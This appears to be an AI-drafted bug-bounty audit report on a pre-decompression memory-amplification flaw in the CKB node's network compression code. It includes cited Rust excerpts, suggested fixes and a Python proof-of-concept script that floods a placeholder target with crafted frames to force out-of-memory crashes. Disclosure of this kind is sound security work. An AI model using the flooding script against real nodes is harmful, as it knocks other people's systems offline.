The code confirms all claims. Let me verify the key details:

**Guard check** — line 235 uses strict `>`: [1](#0-0) 

This means `decompressed_bytes_len == MAX_UNCOMPRESSED_LEN` (8,388,608) passes the check.

**Pre-decompression allocation** — line 242 allocates before decompression: [2](#0-1) 

**Same pattern in `Message::decompress`** — lines 74 and 81: [3](#0-2) 

**Compression enabled by default** — `compress: true` hardcoded: [4](#0-3) 

**`max_frame_length` only bounds compressed wire frame**, not claimed decompressed size: [5](#0-4) 

All cited code references are exact and correct. The exploit path is reachable by any unprivileged peer after completing the P2P handshake. The impact (node OOM crash) matches the allowed High bounty impact class.

---

Audit Report

## Title
Pre-Decompression Buffer Amplification via Attacker-Controlled Snappy Header in `LengthDelimitedCodecWithCompress::decode` — (`network/src/compress.rs`)

## Summary
In `LengthDelimitedCodecWithCompress::decode` and `Message::decompress`, the node allocates a zeroed buffer sized by the attacker-controlled snappy uncompressed-length varint before any decompression is attempted. The only guard is a strict `>` comparison against `MAX_UNCOMPRESSED_LEN` (8 MB), so a value exactly equal to 8,388,608 passes. A tiny wire frame (as small as the Ping protocol's 1 KB `max_frame_length`) can trigger an ~8 MB allocation per message, enabling any unprivileged remote peer to exhaust node memory and crash the process.

## Finding Description
The decode path in `LengthDelimitedCodecWithCompress::decode` (`network/src/compress.rs`, lines 222–262):

1. `self.length_delimited.decode(src)` enforces `max_frame_length` on the **compressed** wire bytes only — it places no bound on the claimed decompressed size.
2. When `COMPRESS_FLAG` is set, `decompress_len(&data[1..])` reads the uncompressed-length varint from the snappy stream header. This value is entirely under attacker control.
3. The guard at line 235 uses strict `>`: `if decompressed_bytes_len > MAX_UNCOMPRESSED_LEN`. Any value ≤ 8,388,608 passes, including exactly 8,388,608.
4. `BytesMut::zeroed(decompressed_bytes_len)` at line 242 allocates up to 8 MB **before** decompression is attempted.
5. If decompression fails (e.g., because the actual payload is only a few bytes), the error path at lines 245–248 drops the buffer — but the allocation already occurred.

The identical pattern exists in `Message::decompress` at lines 74 and 81: the same strict `>` guard followed by `vec![0; decompressed_bytes_len]` before decompression.

`LengthDelimitedCodecWithCompress` is used for all CKB protocols via `CKBProtocol::build()`, and compression is enabled by default (`compress: true`) in both `new_with_support_protocol` and `new`. The `max_frame_length` bounds only the compressed wire frame; for the Ping protocol this is 1,024 bytes, yielding an 8,192× amplification ratio per message.

## Impact Explanation
**High (10001–15000 points): Vulnerabilities which could easily crash a CKB node.**

With the default `max_connection_number` of concurrent sessions each continuously sending crafted frames, peak concurrent allocation can reach tens of gigabytes, causing OOM and node crash. Even at lower concurrency, sustained flooding from a single connection causes repeated large allocations that degrade and eventually crash the node. The attack requires no authentication, no PoW, and no stake.

## Likelihood Explanation
- Any peer that completes the P2P handshake (no privilege required) can open a protocol session and immediately send crafted frames.
- Crafting a valid snappy stream with an inflated header varint requires only knowledge of the publicly documented snappy framing format.
- The `max_frame_length` check does not prevent this: even the smallest protocol (Ping, 1 KB) allows a frame that triggers an 8 MB allocation.
- The strict `>` comparison means the maximum allowed allocation is exactly `MAX_UNCOMPRESSED_LEN` (8,388,608 bytes), not `MAX_UNCOMPRESSED_LEN - 1` as the guard implies.
- The attack is repeatable at line rate with no per-connection rate limiting.

## Recommendation
1. **Bound allocation relative to wire size:** Before allocating, verify `decompressed_bytes_len <= compressed_len * 8` (or a similar ratio bound). Snappy's maximum compression ratio is ~6×, so a generous 8× bound still rejects all malicious frames while accepting all legitimate ones.
2. **Use `>=` instead of `>`** in the guard at line 235 (`LengthDelimitedCodecWithCompress::decode`) and line 74 (`Message::decompress`): `if decompressed_bytes_len >= MAX_UNCOMPRESSED_LEN`.
3. **Apply the same fix to `Message::decompress`** at lines 74–81.
4. **Consider per-connection message rate limiting** to bound the rate at which a single peer can trigger allocations.

## Proof of Concept
```python
import socket, struct

# Snappy stream: varint claiming 8,388,608 decompressed bytes (= MAX_UNCOMPRESSED_LEN, passes > check)
# Varint encoding of 8388608 = 0x80 0x80 0x80 0x04
snappy_header = bytes([0x80, 0x80, 0x80, 0x04])
# Minimal snappy literal: 1 byte
snappy_body = bytes([0x00, 0x41])
snappy_payload = snappy_header + snappy_body

# CKB compress frame: COMPRESS_FLAG (0x80) + snappy payload
ckb_frame = bytes([0x80]) + snappy_payload

# Length-delimited framing: 4-byte big-endian length prefix
wire = struct.pack(">I", len(ckb_frame)) + ckb_frame

s = socket.create_connection(("TARGET_NODE", 8115))
# complete tentacle handshake, then flood:
for _ in range(10000):
    s.sendall(wire)
# Each frame causes BytesMut::zeroed(8_388_608) on the victim before decompression failure.
```

Expected result: victim node RSS grows by ~8 MB per received frame; with many concurrent connections at line rate, RSS reaches system memory limits and the process is killed by OOM.

### Citations

**File:** network/src/compress.rs (L74-81)
```rust
                    if decompressed_bytes_len > MAX_UNCOMPRESSED_LEN {
                        debug!(
                            "The limit for uncompressed bytes len is exceeded. limit: {}, len: {}",
                            MAX_UNCOMPRESSED_LEN, decompressed_bytes_len
                        );
                        Err(io::ErrorKind::InvalidData.into())
                    } else {
                        let mut buf = vec![0; decompressed_bytes_len];
```

**File:** network/src/compress.rs (L235-235)
```rust
                            if decompressed_bytes_len > MAX_UNCOMPRESSED_LEN {
```

**File:** network/src/compress.rs (L242-248)
```rust
                            let mut buf = BytesMut::zeroed(decompressed_bytes_len);
                            match SnapDecoder::new().decompress(&data[1..], &mut buf) {
                                Ok(_) => Ok(Some(buf)),
                                Err(e) => {
                                    debug!("snappy decompress error: {:?}", e);
                                    Err(io::ErrorKind::InvalidData.into())
                                }
```

**File:** network/src/protocols/mod.rs (L218-220)
```rust
            handler,
            compress: true,
        }
```

**File:** network/src/protocols/support_protocols.rs (L122-136)
```rust
    pub fn max_frame_length(&self) -> usize {
        match self {
            SupportProtocols::Ping => 1024,                   // 1   KB
            SupportProtocols::Discovery => 512 * 1024,        // 512 KB
            SupportProtocols::Identify => 2 * 1024,           // 2   KB
            SupportProtocols::Feeler => 1024,                 // 1   KB
            SupportProtocols::DisconnectMessage => 1024,      // 1   KB
            SupportProtocols::Sync => 2 * 1024 * 1024,        // 2   MB
            SupportProtocols::RelayV3 => 4 * 1024 * 1024,     // 4   MB
            SupportProtocols::Time => 1024,                   // 1   KB
            SupportProtocols::Alert => 128 * 1024,            // 128 KB
            SupportProtocols::LightClient => 2 * 1024 * 1024, // 2 MB
            SupportProtocols::Filter => 2 * 1024 * 1024,      // 2   MB
            SupportProtocols::HolePunching => 512 * 1024,     // 512 KB
        }
```
